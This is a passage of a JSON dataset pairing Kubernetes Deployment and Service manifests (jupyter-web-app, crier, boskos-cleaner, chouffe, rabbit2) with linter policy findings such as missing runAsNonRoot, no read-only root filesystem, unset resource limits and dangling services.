    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: jupyter-web-app\n    app.kubernetes.io/component: jupyter-web-app\n    app.kubernetes.io/name: jupyter-web-app\n    kustomize.component: jupyter-web-app\n  name: jupyter-web-app-deployment\n  namespace: kubeflow\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: jupyter-web-app\n      app.kubernetes.io/component: jupyter-web-app\n      app.kubernetes.io/name: jupyter-web-app\n      kustomize.component: jupyter-web-app\n  template:\n    metadata:\n      annotations:\n        sidecar.istio.io/inject: 'false'\n      labels:\n        app: jupyter-web-app\n        app.kubernetes.io/component: jupyter-web-app\n        app.kubernetes.io/name: jupyter-web-app\n        kustomize.component: jupyter-web-app\n    spec:\n      containers:\n      - env:\n        - name: ROK_SECRET_NAME\n          valueFrom:\n            configMapKeyRef:\n              key: ROK_SECRET_NAME\n              name: jupyter-web-app-parameters\n        - name: UI\n          valueFrom:\n            configMapKeyRef:\n              key: UI\n              name: jupyter-web-app-parameters\n        - name: USERID_HEADER\n          valueFrom:\n            configMapKeyRef:\n              key: userid-header\n              name: kubeflow-config-bk4bc7m928\n        - name: USERID_PREFIX\n          valueFrom:\n            configMapKeyRef:\n              key: userid-prefix\n              name: kubeflow-config-bk4bc7m928\n        image: gcr.io/kubeflow-images-public/jupyter-web-app:vmaster-ge4456300\n        imagePullPolicy: Always\n        name: jupyter-web-app\n        ports:\n        - containerPort: 5000\n        volumeMounts:\n        - mountPath: /etc/config\n          name: config-volume\n      serviceAccountName: jupyter-web-app-service-account\n      volumes:\n      - configMap:\n          name: jupyter-web-app-jupyter-web-app-config\n        name: config-volume\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"jupyter-web-app\" has memory limit 0"
  },
  {
    "id": "10075",
    "manifest_path": "data/manifests/the_stack_sample/sample_3876.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: crier\n  labels:\n    app: crier\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: crier\n  template:\n    metadata:\n      labels:\n        app: crier\n    spec:\n      serviceAccountName: crier\n      containers:\n      - name: crier\n        image: gcr.io/k8s-prow/crier:v20210511-f2d83f1102\n        args:\n        - --blob-storage-workers=1\n        - --config-path=/etc/config/config.yaml\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --github-workers=5\n        - --job-config-path=/etc/job-config\n        - --kubernetes-blob-storage-workers=1\n        - --slack-token-file=/etc/slack/token\n        - --slack-workers=1\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: slack\n          mountPath: /etc/slack\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"crier\" does not have a read-only root file system"
  },
  {
    "id": "10076",
    "manifest_path": "data/manifests/the_stack_sample/sample_3876.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: crier\n  labels:\n    app: crier\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: crier\n  template:\n    metadata:\n      labels:\n        app: crier\n    spec:\n      serviceAccountName: crier\n      containers:\n      - name: crier\n        image: gcr.io/k8s-prow/crier:v20210511-f2d83f1102\n        args:\n        - --blob-storage-workers=1\n        - --config-path=/etc/config/config.yaml\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --github-workers=5\n        - --job-config-path=/etc/job-config\n        - --kubernetes-blob-storage-workers=1\n        - --slack-token-file=/etc/slack/token\n        - --slack-workers=1\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: slack\n          mountPath: /etc/slack\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"crier\" not found"
  },
  {
    "id": "10077",
    "manifest_path": "data/manifests/the_stack_sample/sample_3876.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: crier\n  labels:\n    app: crier\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: crier\n  template:\n    metadata:\n      labels:\n        app: crier\n    spec:\n      serviceAccountName: crier\n      containers:\n      - name: crier\n        image: gcr.io/k8s-prow/crier:v20210511-f2d83f1102\n        args:\n        - --blob-storage-workers=1\n        - --config-path=/etc/config/config.yaml\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --github-workers=5\n        - --job-config-path=/etc/job-config\n        - --kubernetes-blob-storage-workers=1\n        - --slack-token-file=/etc/slack/token\n        - --slack-workers=1\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: slack\n          mountPath: /etc/slack\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"crier\" is not set to runAsNonRoot"
  },
  {
    "id": "10078",
    "manifest_path": "data/manifests/the_stack_sample/sample_3876.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: crier\n  labels:\n    app: crier\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: crier\n  template:\n    metadata:\n      labels:\n        app: crier\n    spec:\n      serviceAccountName: crier\n      containers:\n      - name: crier\n        image: gcr.io/k8s-prow/crier:v20210511-f2d83f1102\n        args:\n        - --blob-storage-workers=1\n        - --config-path=/etc/config/config.yaml\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --github-workers=5\n        - --job-config-path=/etc/job-config\n        - --kubernetes-blob-storage-workers=1\n        - --slack-token-file=/etc/slack/token\n        - --slack-workers=1\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: slack\n          mountPath: /etc/slack\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"crier\" has cpu request 0"
  },
  {
    "id": "10079",
    "manifest_path": "data/manifests/the_stack_sample/sample_3876.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: crier\n  labels:\n    app: crier\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: crier\n  template:\n    metadata:\n      labels:\n        app: crier\n    spec:\n      serviceAccountName: crier\n      containers:\n      - name: crier\n        image: gcr.io/k8s-prow/crier:v20210511-f2d83f1102\n        args:\n        - --blob-storage-workers=1\n        - --config-path=/etc/config/config.yaml\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --github-workers=5\n        - --job-config-path=/etc/job-config\n        - --kubernetes-blob-storage-workers=1\n        - --slack-token-file=/etc/slack/token\n        - --slack-workers=1\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: slack\n          mountPath: /etc/slack\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"crier\" has memory limit 0"
  },
  {
    "id": "10080",
    "manifest_path": "data/manifests/the_stack_sample/sample_3878.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: boskos-cleaner\n  labels:\n    app: prow\n    component: boskos-cleaner\n  namespace: ci\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      component: boskos-cleaner\n  template:\n    metadata:\n      labels:\n        app: prow\n        component: boskos-cleaner\n    spec:\n      serviceAccountName: boskos\n      containers:\n      - name: boskos-cleaner\n        image: gcr.io/k8s-prow/boskos/cleaner:v20200504-d9345ee90\n        args:\n        - --boskos-url=http://boskos\n        - --use-v2-implementation=true\n        - --namespace=$(namespace)\n        - --log-level=debug\n        env:\n        - name: namespace\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"boskos-cleaner\" does not have a read-only root file system"
  },
  {
    "id": "10081",
    "manifest_path": "data/manifests/the_stack_sample/sample_3878.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: boskos-cleaner\n  labels:\n    app: prow\n    component: boskos-cleaner\n  namespace: ci\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      component: boskos-cleaner\n  template:\n    metadata:\n      labels:\n        app: prow\n        component: boskos-cleaner\n    spec:\n      serviceAccountName: boskos\n      containers:\n      - name: boskos-cleaner\n        image: gcr.io/k8s-prow/boskos/cleaner:v20200504-d9345ee90\n        args:\n        - --boskos-url=http://boskos\n        - --use-v2-implementation=true\n        - --namespace=$(namespace)\n        - --log-level=debug\n        env:\n        - name: namespace\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"boskos\" not found"
  },
  {
    "id": "10082",
    "manifest_path": "data/manifests/the_stack_sample/sample_3878.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: boskos-cleaner\n  labels:\n    app: prow\n    component: boskos-cleaner\n  namespace: ci\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      component: boskos-cleaner\n  template:\n    metadata:\n      labels:\n        app: prow\n        component: boskos-cleaner\n    spec:\n      serviceAccountName: boskos\n      containers:\n      - name: boskos-cleaner\n        image: gcr.io/k8s-prow/boskos/cleaner:v20200504-d9345ee90\n        args:\n        - --boskos-url=http://boskos\n        - --use-v2-implementation=true\n        - --namespace=$(namespace)\n        - --log-level=debug\n        env:\n        - name: namespace\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"boskos-cleaner\" is not set to runAsNonRoot"
  },
  {
    "id": "10083",
    "manifest_path": "data/manifests/the_stack_sample/sample_3878.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: boskos-cleaner\n  labels:\n    app: prow\n    component: boskos-cleaner\n  namespace: ci\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      component: boskos-cleaner\n  template:\n    metadata:\n      labels:\n        app: prow\n        component: boskos-cleaner\n    spec:\n      serviceAccountName: boskos\n      containers:\n      - name: boskos-cleaner\n        image: gcr.io/k8s-prow/boskos/cleaner:v20200504-d9345ee90\n        args:\n        - --boskos-url=http://boskos\n        - --use-v2-implementation=true\n        - --namespace=$(namespace)\n        - --log-level=debug\n        env:\n        - name: namespace\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"boskos-cleaner\" has cpu request 0"
  },
  {
    "id": "10084",
    "manifest_path": "data/manifests/the_stack_sample/sample_3878.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: boskos-cleaner\n  labels:\n    app: prow\n    component: boskos-cleaner\n  namespace: ci\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      component: boskos-cleaner\n  template:\n    metadata:\n      labels:\n        app: prow\n        component: boskos-cleaner\n    spec:\n      serviceAccountName: boskos\n      containers:\n      - name: boskos-cleaner\n        image: gcr.io/k8s-prow/boskos/cleaner:v20200504-d9345ee90\n        args:\n        - --boskos-url=http://boskos\n        - --use-v2-implementation=true\n        - --namespace=$(namespace)\n        - --log-level=debug\n        env:\n        - name: namespace\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"boskos-cleaner\" has memory limit 0"
  },
  {
    "id": "10085",
    "manifest_path": "data/manifests/the_stack_sample/sample_3879.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: chouffe\nspec:\n  ports:\n  - name: http\n    targetPort: 80\n    port: 80\n  selector:\n    app: chouffe\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:chouffe])"
  },
  {
    "id": "10086",
    "manifest_path": "data/manifests/the_stack_sample/sample_3881.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: rabbit2\n  labels:\n    name: RabbitMQ2\nspec:\n  selector:\n    app: rabbit2\n  type: ClusterIP\n  ports:\n  - protocol: TCP\n    name: epmd\n    port: 4369\n  - protocol: TCP\n    name: epmd-range\n    port: 44001\n  - protocol: TCP\n    name: amqp-tls\n    port: 5671\n  - protocol: TCP\n    name: amqp\n    port: 5672\n  - protocol: TCP\n    name: erlang\n    port: 25672\n  - protocol: TCP\n    name: mgmt\n    port: 15672\n  - protocol: TCP\n    name: stomp1\n    port: 61613\n  - protocol: TCP\n    name: stomp2\n    port: 61614\n  - protocol: TCP\n    name: mqtt1\n    port: 1883\n  - protocol: TCP\n    name: mqtt2\n    port: 8883\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:rabbit2])"
  }
]